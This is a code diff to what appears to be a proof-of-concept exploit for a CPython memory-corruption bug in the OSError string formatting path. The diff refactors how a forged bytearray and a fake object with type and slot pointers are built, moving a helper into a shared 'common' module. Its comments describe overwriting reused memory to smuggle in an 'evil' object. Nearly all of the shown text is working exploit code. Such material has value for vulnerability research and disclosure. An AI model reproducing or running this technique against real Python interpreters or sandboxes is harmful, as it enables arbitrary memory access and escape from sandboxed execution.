@@ -44,6 +44,8 @@ OSError_str(PyObject *op)
 # the format func will still use it, so we can overwrite that memory with a fake object that has our evil object in one of
 # its slots and a custom `__str__` function to retrieve that evil object.
 
+from common import evil_bytearray_obj, p_long
+
 class catch:
     __slots__ = ("mem",)
     def __str__(self):
@@ -61,21 +63,13 @@ class evil:
 class bytes_subclass(bytes):
     pass
 
-p64 = lambda num: num.to_bytes(8, 'little')
-fake_ba = (
-    p64(0x54321) + 
-    p64(id(bytearray)) +
-    p64(2**63 - 1) +
-    p64(2**63 - 1) +
-    p64(0) +
-    p64(0)
-)
+# see ./common/common.py for evil bytearray obj explanation
+fake_ba, ba_addr = evil_bytearray_obj()
 
 fake_obj = (
-    p64(0x12345) +   # ob_refcnt 
-    p64(id(catch)) + # ob_type
-    p64(id(fake_ba)  # slot 1 (`mem` in our case)
-        + bytes.__basicsize__ - 1)
+    p_long(0x12345) +   # ob_refcnt 
+    p_long(id(catch)) + # ob_type
+    p_long(ba_addr)  # slot 1 (`mem` in our case)
 )
 
 SIZE = 0x100
